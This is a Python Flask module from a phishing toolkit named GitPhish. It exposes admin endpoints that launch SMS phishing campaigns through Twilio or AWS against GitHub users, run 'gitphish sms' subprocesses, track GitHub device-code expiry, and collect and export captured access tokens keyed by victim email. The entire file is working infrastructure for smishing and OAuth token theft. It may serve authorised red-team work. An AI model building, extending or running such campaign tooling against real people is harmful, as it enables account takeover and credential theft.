"""
SMS Campaigns API for GitPhish Admin Interface.
Provides REST endpoints for managing AWS SNS and Twilio SMS campaigns.
"""

import json
import subprocess
import tempfile
import os
import logging
from datetime import datetime, timedelta
from typing import Dict, Any, Optional
from flask import request, jsonify
import boto3
from twilio.rest import Client
from botocore.exceptions import BotoCoreError, ClientError

logger = logging.getLogger(__name__)

class SMSCampaignsAPI:
    """API handler for SMS campaigns functionality."""
    
    def __init__(self, app, github_account_service, compromised_account_service):
        self.app = app
        self.github_account_service = github_account_service
        self.compromised_account_service = compromised_account_service
        self.active_campaigns = {}  # In-memory storage for demo - use DB in production
        self._setup_routes()

    def _setup_routes(self):
        """Setup API routes."""
        
        @self.app.route('/api/sms-campaigns/start', methods=['POST'])
        def start_campaign():
            """Start a new SMS campaign."""
            try:
                data = request.get_json()
                
                # Validate required fields
                required_fields = ['platform', 'provider', 'name']
                for field in required_fields:
                    if not data.get(field):
                        return jsonify({'success': False, 'error': f'{field} is required'}), 400
                
                platform = data['platform']  # 'github' or 'azure'
                provider = data['provider']  # 'twilio' or 'aws'
                
                # Build command based on platform and provider
                cmd_args = self._build_campaign_command(data)
                if not cmd_args:
                    return jsonify({'success': False, 'error': 'Invalid campaign configuration'}), 400
                
                # Generate campaign ID
                campaign_id = f"{platform}_{provider}_{datetime.now().strftime('%Y%m%d_%H%M%S')}"
                
                # Store campaign info
                self.active_campaigns[campaign_id] = {
                    'id': campaign_id,
                    'platform': platform,
                    'provider': provider,
                    'name': data['name'],
                    'status': 'starting',
                    'started': datetime.now().isoformat(),
                    'target_count': self._count_targets(data),
                    'command': cmd_args
                }
                
                # Start the campaign subprocess
                try:
                    # Get current environment and add AWS credentials if needed
                    env = os.environ.copy()
                    if data.get('provider') == 'aws':
                        if data.get('awsAccessKeyId'):
                            env['AWS_ACCESS_KEY_ID'] = data['awsAccessKeyId']
                        if data.get('awsSecretAccessKey'):
                            env['AWS_SECRET_ACCESS_KEY'] = data['awsSecretAccessKey']
                        if data.get('awsSessionToken') and data['awsSessionToken'].strip():
                            env['AWS_SESSION_TOKEN'] = data['awsSessionToken']
                        if data.get('awsRegion'):
                            env['AWS_DEFAULT_REGION'] = data['awsRegion']
                    
                    # Get the correct working directory (where the python module is)
                    current_file = os.path.abspath(__file__)
                    # Navigate from api file to root
                    root_dir = os.path.dirname(os.path.dirname(os.path.dirname(os.path.dirname(os.path.dirname(current_file)))))
                    
                    process = subprocess.Popen(
                        cmd_args, 
                        stdout=subprocess.PIPE, 
                        stderr=subprocess.PIPE,
                        env=env,
                        cwd=root_dir
                    )
                    self.active_campaigns[campaign_id]['process'] = process
                    self.active_campaigns[campaign_id]['status'] = 'running'
                    
                    logger.info(f"Started SMS campaign {campaign_id} with command: {' '.join(cmd_args)}")
                    if data.get('provider') == 'aws':
                        logger.info(f"AWS credentials set for campaign {campaign_id}")
                    
                    # Log initial output for debugging
                    try:
                        stdout_data, stderr_data = process.communicate(timeout=5)
                        if stdout_data:
                            logger.info(f"Campaign {campaign_id} stdout: {stdout_data.decode()}")
                        if stderr_data:
                            logger.error(f"Campaign {campaign_id} stderr: {stderr_data.decode()}")
                    except subprocess.TimeoutExpired:
                        logger.info(f"Campaign {campaign_id} still running after 5 seconds")
                    except Exception as comm_e:
                        logger.error(f"Error getting campaign output: {str(comm_e)}")
                    
                except Exception as e:
                    logger.error(f"Failed to start campaign process: {str(e)}")
                    self.active_campaigns[campaign_id]['status'] = 'failed'
                    self.active_campaigns[campaign_id]['error'] = str(e)
                
                return jsonify({
                    'success': True, 
                    'campaign_id': campaign_id,
                    'message': 'Campaign started successfully'
                })
                
            except Exception as e:
                logger.error(f"Error starting campaign: {str(e)}")
                return jsonify({'success': False, 'error': str(e)}), 500

        @self.app.route('/api/sms-campaigns/list', methods=['GET'])
        def list_campaigns():
            """List all campaigns."""
            try:
                # Update campaign statuses
                for campaign_id, campaign in self.active_campaigns.items():
                    # Check if campaign has captured tokens
                    tokens = self._find_campaign_tokens(campaign_id, campaign.get('name', ''))
                    if tokens and campaign['status'] in ['running', 'completed']:
                        campaign['status'] = 'token received'
                        campaign['tokens_captured'] = len(tokens)
                    
                    # Check for expired campaigns (GitHub device codes expire after 15 minutes typically)
                    if campaign['status'] == 'running' and self._is_campaign_expired(campaign):
                        campaign['status'] = 'expired'
                        campaign['finished'] = datetime.now().isoformat()
                    
                    # Check process status for running campaigns
                    if 'process' in campaign and campaign['status'] == 'running':
                        process = campaign['process']
                        if process.poll() is not None:  # Process has finished
                            if tokens:
                                campaign['status'] = 'token received'
                                campaign['tokens_captured'] = len(tokens)
                            else:
                                campaign['status'] = 'completed' if process.returncode == 0 else 'failed'
                            campaign['finished'] = datetime.now().isoformat()
                
                # Create JSON-serializable copy without process objects
                campaigns_json = []
                for campaign in self.active_campaigns.values():
                    campaign_copy = campaign.copy()
                    # Remove non-serializable objects
                    campaign_copy.pop('process', None)
                    campaigns_json.append(campaign_copy)
                
                return jsonify({'success': True, 'campaigns': campaigns_json})
                
            except Exception as e:
                logger.error(f"Error listing campaigns: {str(e)}")
                return jsonify({'success': False, 'error': str(e)}), 500

        @self.app.route('/api/sms-campaigns/stop/<campaign_id>', methods=['POST'])
        def stop_campaign(campaign_id):
            """Stop a running campaign."""
            try:
                if campaign_id not in self.active_campaigns:
                    return jsonify({'success': False, 'error': 'Campaign not found'}), 404
                
                campaign = self.active_campaigns[campaign_id]
                
                if 'process' in campaign and campaign['status'] == 'running':
                    process = campaign['process']
                    process.terminate()
                    campaign['status'] = 'stopped'
                    campaign['finished'] = datetime.now().isoformat()
                    
                    logger.info(f"Stopped SMS campaign {campaign_id}")
                
                return jsonify({'success': True, 'message': 'Campaign stopped successfully'})
                
            except Exception as e:
                logger.error(f"Error stopping campaign: {str(e)}")
                return jsonify({'success': False, 'error': str(e)}), 500

        @self.app.route('/api/sms-campaigns/test-twilio', methods=['POST'])
        def test_twilio():
            """Test Twilio configuration."""
            try:
                data = request.get_json()
                sid = data.get('sid')
                token = data.get('token')
                
                if not sid or not token:
                    return jsonify({'success': False, 'error': 'SID and token are required'}), 400
                
                # Test Twilio connection
                client = Client(sid, token)
                account = client.api.accounts(sid).fetch()
                
                return jsonify({
                    'success': True, 
                    'message': f'Twilio connection successful. Account: {account.friendly_name}'
                })
                
            except Exception as e:
                logger.error(f"Error testing Twilio: {str(e)}")
                return jsonify({'success': False, 'error': str(e)}), 500

        @self.app.route('/api/sms-campaigns/test-aws', methods=['POST'])
        def test_aws():
            """Test AWS SNS configuration."""
            try:
                data = request.get_json()
                access_key_id = data.get('accessKeyId')
                secret_access_key = data.get('secretAccessKey')
                session_token = data.get('sessionToken')
                region = data.get('region', 'us-east-2')
                
                if not access_key_id or not secret_access_key:
                    return jsonify({'success': False, 'error': 'Access Key ID and Secret Access Key are required'}), 400
                
                # Build client configuration
                client_config = {
                    'aws_access_key_id': access_key_id,
                    'aws_secret_access_key': secret_access_key,
                    'region_name': region
                }
                
                # Add session token if provided
                if session_token and session_token.strip():
                    client_config['aws_session_token'] = session_token
                
                # Test AWS SNS connection with provided credentials
                sns_client = boto3.client('sns', **client_config)
                response = sns_client.list_topics()
                
                return jsonify({
                    'success': True, 
                    'message': f'AWS SNS connection successful. Region: {region}'
                })
                
            except (BotoCoreError, ClientError) as e:
                logger.error(f"Error testing AWS: {str(e)}")
                return jsonify({'success': False, 'error': str(e)}), 500
            except Exception as e:
                logger.error(f"Error testing AWS: {str(e)}")
                return jsonify({'success': False, 'error': str(e)}), 500

        @self.app.route('/api/sms-campaigns/list-aws-numbers', methods=['GET'])
        def list_aws_numbers():
            """List available AWS SMS numbers."""
            try:
                region = request.args.get('region', 'us-east-2')
                pinpoint_client = boto3.client('pinpoint-sms-voice-v2', region_name=region)
                
                response = pinpoint_client.describe_pools(MaxResults=10)
                pools = response.get("Pools", [])
                
                numbers_info = []
                for pool in pools:
                    pool_id = pool.get("PoolId")
                    pool_info = {
                        'id': pool_id,
                        'status': pool.get('Status'),
                        'type': pool.get('MessageType'),
                        'numbers': []
                    }
                    
                    try:
                        originators = pinpoint_client.list_pool_origination_identities(
                            PoolId=pool_id
                        ).get("OriginationIdentities", [])
                        
                        for orig in originators:
                            pool_info['numbers'].append({
                                'identity': orig.get('Identity'),
                                'country': orig.get('IsoCountryCode', 'Unknown')
                            })
                            
                    except Exception as sub_e:
                        logger.warning(f"Failed to fetch originators for pool {pool_id}: {sub_e}")
                    
                    numbers_info.append(pool_info)
                
                return jsonify({'success': True, 'numbers': numbers_info})
                
            except (BotoCoreError, ClientError) as e:
                logger.error(f"Error listing AWS numbers: {str(e)}")
                return jsonify({'success': False, 'error': str(e)}), 500
            except Exception as e:
                logger.error(f"Error listing AWS numbers: {str(e)}")
                return jsonify({'success': False, 'error': str(e)}), 500

        @self.app.route('/api/sms-campaigns/logs/<campaign_id>', methods=['GET'])
        def get_campaign_logs(campaign_id):
            """Get live logs for a campaign."""
            try:
                if campaign_id not in self.active_campaigns:
                    return jsonify({'success': False, 'error': 'Campaign not found'}), 404
                
                campaign = self.active_campaigns[campaign_id]
                
                # Get output from subprocess if still running
                output = ""
                if 'process' in campaign:
                    process = campaign['process']
                    if process.poll() is None:  # Still running
                        # Try to read available output without blocking
                        try:
                            stdout_data = process.stdout.read()
                            stderr_data = process.stderr.read()
                            if stdout_data:
                                output += stdout_data.decode()
                            if stderr_data:
                                output += "\n--- STDERR ---\n" + stderr_data.decode()
                        except:
                            pass
                    else:
                        # Process finished, get all output
                        stdout_data, stderr_data = process.communicate()
                        if stdout_data:
                            output += stdout_data.decode()
                        if stderr_data:
                            output += "\n--- STDERR ---\n" + stderr_data.decode()
                
                # Check for token files and parse them
                tokens = self._find_campaign_tokens(campaign_id, campaign.get('name', ''))
                
                # Calculate stats
                stats = {
                    'status': campaign.get('status', 'unknown'),
                    'sms_sent': 1 if 'Text message successfully sent' in output else 0,
                    'tokens_captured': len(tokens),
                    'runtime': self._calculate_runtime(campaign.get('started'))
                }
                
                return jsonify({
                    'success': True,
                    'output': output,
                    'stats': stats,
                    'tokens': tokens
                })
                
            except Exception as e:
                logger.error(f"Error getting campaign logs: {str(e)}")
                return jsonify({'success': False, 'error': str(e)}), 500

        @self.app.route('/api/sms-campaigns/logs/<campaign_id>/download', methods=['GET'])
        def download_campaign_logs(campaign_id):
            """Download campaign logs as text file."""
            try:
                if campaign_id not in self.active_campaigns:
                    return jsonify({'success': False, 'error': 'Campaign not found'}), 404
                
                campaign = self.active_campaigns[campaign_id]
                
                # Get full output
                output = f"Campaign ID: {campaign_id}\n"
                output += f"Campaign Name: {campaign.get('name', 'Unknown')}\n"
                output += f"Platform: {campaign.get('platform', 'Unknown')}\n"
                output += f"Provider: {campaign.get('provider', 'Unknown')}\n"
                output += f"Started: {campaign.get('started', 'Unknown')}\n"
                output += f"Status: {campaign.get('status', 'Unknown')}\n"
                output += "=" * 50 + "\n\n"
                
                # Get subprocess output
                if 'process' in campaign:
                    process = campaign['process']
                    try:
                        if process.poll() is None:
                            stdout_data = process.stdout.read()
                            stderr_data = process.stderr.read()
                        else:
                            stdout_data, stderr_data = process.communicate()
                        
                        if stdout_data:
                            output += "STDOUT:\n" + stdout_data.decode() + "\n\n"
                        if stderr_data:
                            output += "STDERR:\n" + stderr_data.decode() + "\n\n"
                    except:
                        output += "Error reading process output\n"
                
                # Return as downloadable file
                from flask import make_response
                response = make_response(output)
                response.headers['Content-Type'] = 'text/plain'
                response.headers['Content-Disposition'] = f'attachment; filename=campaign-{campaign_id}-logs.txt'
                return response
                
            except Exception as e:
                logger.error(f"Error downloading campaign logs: {str(e)}")
                return jsonify({'success': False, 'error': str(e)}), 500

        @self.app.route('/api/sms-campaigns/tokens/<campaign_id>/download', methods=['GET'])
        def download_campaign_tokens(campaign_id):
            """Download captured tokens as JSON."""
            try:
                if campaign_id not in self.active_campaigns:
                    return jsonify({'success': False, 'error': 'Campaign not found'}), 404
                
                campaign = self.active_campaigns[campaign_id]
                tokens = self._find_campaign_tokens(campaign_id, campaign.get('name', ''))
                
                return jsonify({
                    'success': True,
                    'campaign_id': campaign_id,
                    'tokens': tokens,
                    'exported_at': datetime.now().isoformat()
                })
                
            except Exception as e:
                logger.error(f"Error downloading campaign tokens: {str(e)}")
                return jsonify({'success': False, 'error': str(e)}), 500

    def _build_campaign_command(self, data: Dict[str, Any]) -> Optional[list]:
        """Build the command line arguments for the campaign."""
        try:
            platform = data['platform']
            provider = data['provider']
            
            # Base command - use python module
            cmd = ['python', '-m', 'gitphish', 'sms']
            
            # Determine the mode based on provider and platform
            if provider == 'twilio' and platform == 'github':
                cmd.append('twilio-github')
            elif provider == 'aws' and platform == 'github':
                cmd.append('aws-github')
            else:
                return None
            
            # Add target information
            if data.get('targetMethod') == 'single':
                if data.get('targetEmail'):
                    cmd.extend(['--email', data['targetEmail']])
                if data.get('targetPhone'):
                    cmd.extend(['--phone', data['targetPhone']])
            else:
                # Handle file upload - for now, we'll create a temporary file
                # In production, you'd want to handle file uploads properly
                if data.get('targetFile'):
                    # This would need proper file handling
                    cmd.extend(['-f', '/tmp/targets.csv'])  # Placeholder
            
            # Add provider-specific arguments
            if provider == 'twilio':
                if data.get('twilioSid'):
                    cmd.extend(['--sid', data['twilioSid']])
                if data.get('twilioToken'):
                    cmd.extend(['--token', data['twilioToken']])
                if data.get('fromPhone'):
                    cmd.extend(['--from-phone', data['fromPhone']])
            elif provider == 'aws':
                if data.get('awsRegion'):
                    cmd.extend(['--region', data['awsRegion']])
            
            # Add optional arguments
            if data.get('scope'):
                cmd.extend(['--scope', data['scope']])
            
            if data.get('debug'):
                cmd.append('--debug')
            
            if data.get('messageTemplate'):
                cmd.extend(['--message', data['messageTemplate']])
            
            return cmd
            
        except Exception as e:
            logger.error(f"Error building campaign command: {str(e)}")
            return None

    def _count_targets(self, data: Dict[str, Any]) -> int:
        """Count the number of targets in the campaign."""
        if data.get('targetMethod') == 'single':
            return 1 if data.get('targetEmail') else 0
        else:
            # For file uploads, we'd need to count lines in the file
            # For now, return placeholder
            return 0  # This would be implemented with proper file handling

    def _find_campaign_tokens(self, campaign_id: str, campaign_name: str) -> list:
        """Find and parse token files generated by the campaign."""
        import glob
        tokens = []
        
        try:
            # Look for token files in the current directory
            # GitHub tokens: {email}.github_token.json
            # Azure tokens: {email}.tokeninfo.json
            
            token_files = glob.glob('*.github_token.json') + glob.glob('*.tokeninfo.json')
            
            for token_file in token_files:
                try:
                    with open(token_file, 'r') as f:
                        token_data = json.load(f)
                        
                    # Extract email from filename
                    email = token_file.replace('.github_token.json', '').replace('.tokeninfo.json', '')
                    
                    tokens.append({
                        'email': email,
                        'access_token': token_data.get('access_token', 'N/A'),
                        'file': token_file,
                        'captured_at': os.path.getmtime(token_file)
                    })
                except Exception as e:
                    logger.error(f"Error parsing token file {token_file}: {str(e)}")
                    
        except Exception as e:
            logger.error(f"Error finding token files: {str(e)}")
        
        return tokens

    def _calculate_runtime(self, started_time: str) -> str:
        """Calculate how long the campaign has been running."""
        if not started_time:
            return 'Unknown'
        
        try:
            start_dt = datetime.fromisoformat(started_time.replace('Z', '+00:00'))
            now_dt = datetime.now(start_dt.tzinfo) if start_dt.tzinfo else datetime.now()
            
            delta = now_dt - start_dt
            
            if delta.days > 0:
                return f"{delta.days}d {delta.seconds // 3600}h"
            elif delta.seconds >= 3600:
                return f"{delta.seconds // 3600}h {(delta.seconds % 3600) // 60}m"
            elif delta.seconds >= 60:
                return f"{delta.seconds // 60}m {delta.seconds % 60}s"
            else:
                return f"{delta.seconds}s"
                
        except Exception as e:
            logger.error(f"Error calculating runtime: {str(e)}")
            return 'Error'

    def _is_campaign_expired(self, campaign: Dict[str, Any]) -> bool:
        """Check if a campaign has expired (GitHub device codes expire after 15 minutes)."""
        if not campaign.get('started'):
            return False
        
        try:
            start_dt = datetime.fromisoformat(campaign['started'].replace('Z', '+00:00'))
            now_dt = datetime.now(start_dt.tzinfo) if start_dt.tzinfo else datetime.now()
            
            # GitHub device codes typically expire after 15 minutes
            # Add a buffer for processing time
            expiry_duration = timedelta(minutes=16)
            
            return now_dt - start_dt > expiry_duration
            
        except Exception as e:
            logger.error(f"Error checking campaign expiry: {str(e)}")
            return False